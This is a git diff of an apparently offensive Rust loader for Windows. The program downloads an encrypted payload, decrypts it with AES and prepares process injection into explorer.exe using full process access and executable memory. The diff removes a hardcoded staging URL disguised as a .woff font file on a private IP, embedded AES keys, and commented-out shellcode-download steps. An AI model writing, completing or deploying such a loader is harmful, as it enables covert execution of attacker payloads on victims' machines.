@@ -9,11 +9,6 @@ use std::{ptr, process::exit};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
-const URL: &str = "http://192.168.8.111:8443/test.woff";
-
-const AESKEY: &str = "oPqVTb-ieogwPT94";
-const AESIV: &str  = "lbzPx4uGUpAx7Wap";
-
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
 struct Args {
@@ -43,7 +38,6 @@ fn download_and_execute(url: String, binary:String, compression: String, aes_key
 }
 
 fn decompress() {}
-
 
 fn decrypt(ciphertext: &[u8], aes_key: &[u8], aes_iv: &[u8]) -> Result<Vec<u8>, &'static str> {
     // Choose the AES type based on the key length (128 or 256 bits)
@@ -101,24 +95,6 @@ fn main() {
 
     println!("Hello {}!", args.url);
     download_and_execute(args.url, args.binary, "Hello".to_string(), args.aes_key, args.aes_iv);
-
-    //Download shellcode stage and execute process injection
-    // let shellcode_url: &str = "http://x.x.x.x/fontawesome.woff";
-    // let shellcode: Vec<u8>;
-    // match download_shellcode_from_url(shellcode_url) {
-    //     Ok(downloaded_bytes) => {
-    //         shellcode = downloaded_bytes;
-    //     }
-    //     Err(e) => {
-    //         panic!("{}", e);
-    //     }
-    // }
-
-    // println!("Downloaded shellcode: {} bytes", shellcode.len());
-
-    //Decrypt Shellcode
-
-    //Decompress Shellcode
 
     // let process_name = "explorer.exe";
     // let pid = find_process_by_name(process_name);
